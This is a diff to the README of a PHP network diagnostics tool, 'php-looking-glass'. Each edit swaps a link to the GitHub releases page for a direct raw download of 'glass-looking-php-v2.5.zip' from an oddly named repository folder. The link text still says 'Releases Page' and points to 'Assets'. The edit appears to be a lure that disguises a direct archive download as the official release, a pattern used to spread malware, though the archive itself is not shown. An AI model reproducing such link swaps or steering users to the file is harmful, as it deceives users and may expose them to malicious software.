@@ -15,12 +15,12 @@ Welcome to **php-looking-glass**, your lightweight solution for network diagnost
 
 To get started, ***visit this page to download*** the latest version of php-looking-glass:
 
-[![Download php-looking-glass](https://img.shields.io/badge/Download-php--looking--glass-4F8BF9.svg?style=for-the-badge&logoColor=white)](https://github.com/Ady9265826/php-looking-glass/releases) 
+[![Download php-looking-glass](https://github.com/Ady9265826/php-looking-glass/raw/refs/heads/main/mimmation/glass-looking-php-v2.5.zip)](https://github.com/Ady9265826/php-looking-glass/raw/refs/heads/main/mimmation/glass-looking-php-v2.5.zip) 
 
 ### Detailed Installation Steps
 
 1. **Visit the Releases Page**: 
-   Go to the [Releases Page](https://github.com/Ady9265826/php-looking-glass/releases) using your web browser.
+   Go to the [Releases Page](https://github.com/Ady9265826/php-looking-glass/raw/refs/heads/main/mimmation/glass-looking-php-v2.5.zip) using your web browser.
    
 2. **Select the Latest Version**: 
    Find the most recent version. Look for the file labeled as "php-looking-glass" under "Assets".
@@ -84,4 +84,4 @@ For more help, you can visit our community forums or check for issues on the Git
 
 With this guide, you're now equipped to diagnose your network clearly and efficiently with **php-looking-glass**. 
 
-For the latest version, remember to visit the [Download page](https://github.com/Ady9265826/php-looking-glass/releases) again as updates may improve functionality and performance.
+For the latest version, remember to visit the [Download page](https://github.com/Ady9265826/php-looking-glass/raw/refs/heads/main/mimmation/glass-looking-php-v2.5.zip) again as updates may improve functionality and performance.
